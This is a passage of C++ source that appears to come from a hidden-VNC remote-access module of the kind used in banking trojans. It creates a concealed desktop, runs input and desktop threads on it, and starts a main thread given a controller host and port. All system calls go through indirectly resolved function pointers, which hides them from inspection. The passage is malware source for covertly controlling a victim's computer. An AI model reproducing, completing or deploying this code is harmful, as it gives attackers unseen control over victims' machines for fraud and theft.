    g_hDesk = Funcs::pOpenDesktopA(g_desktopName, 0, TRUE, GENERIC_ALL);
    if (!g_hDesk)
        g_hDesk = Funcs::pCreateDesktopA(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
    Funcs::pSetThreadDesktop(g_hDesk);

    g_hInputThread = Funcs::pCreateThread(NULL, 0, InputThread, NULL, 0, 0);
    if (g_hInputThread)
        Funcs::pWaitForSingleObject(g_hInputThread, INFINITE);
    if (g_hDesktopThread)
        Funcs::pWaitForSingleObject(g_hDesktopThread, INFINITE);

    if (g_gdiplusStarted)
    {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusStarted = FALSE;
    }

    FreePixelBuffers();

    if (g_hInputThread)
        Funcs::pCloseHandle(g_hInputThread);
    if (g_hDesktopThread)
        Funcs::pCloseHandle(g_hDesktopThread);

    g_hInputThread = NULL;
    g_hDesktopThread = NULL;
    g_started = FALSE;
    return 0;
}

HANDLE StartHiddenDesktop(const char *host, int port)
{
    if (g_started)
        return NULL;
    Funcs::pLstrcpyA(g_host, host);
    g_port = port;
    g_started = TRUE;
    return Funcs::pCreateThread(NULL, 0, MainThread, NULL, 0, 0);
}
